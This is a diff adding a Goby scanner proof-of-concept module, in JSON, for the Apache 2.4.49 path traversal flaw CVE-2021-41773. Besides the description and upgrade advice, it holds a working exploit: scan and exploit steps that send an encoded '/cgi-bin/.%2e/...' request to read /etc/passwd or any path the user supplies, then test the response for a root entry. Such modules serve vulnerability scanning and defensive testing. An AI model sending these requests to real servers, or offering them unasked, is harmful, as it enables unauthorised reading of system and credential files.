@@ -1,0 +1,98 @@
+{
+      "Name": "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
+      "Level": "2",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "product=\"Apache-Web-Server\"",
+      "Description": "An attacker can use a path-walking attack to map urls to files other than the intended document root.  If files outside the document root are not protected by 'require all denied', then attackers can access them  ",
+      "Product": "Apache/2.4.49",
+      "Homepage": "https://httpd.apache.org",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p>An attacker can use a path-walking attack to map urls to files other than the intended document root.&nbsp; If files outside the document root are not protected by 'require all denied', then attackers can access them&nbsp;&nbsp;<br></p>",
+      "Recommendation": "<p>Users can protect themselves by upgrading to version 2.4.50.&nbsp; It should be noted that the researchers report that \"request all denial\" (denying access to all requests) is the default setting for securing documents outside of the Web root directory -- which alleviates this problem.&nbsp;&nbsp;<br></p>",
+      "References": [
+            "https://mp.weixin.qq.com/s?src=11&timestamp=1633533436&ver=3358&signature=2WIeZ*MU*D90aNdj2wmW55th5WWecksL2I8I8u2J*jnnq17UCiSkdje1JJGlIqGfzv61pmOfWG7lpRv7rkX1pMirxKVDViUr33H4eKZGzhSfBVtKdXAWV3a5prZoIvq-&new=1"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "path",
+                  "Type": "input",
+                  "Value": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "root:[x*]?:0:0:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{path}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||undefined"
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-06 23:35:03",
+      "GobyVersion": "1.8.301"
+}
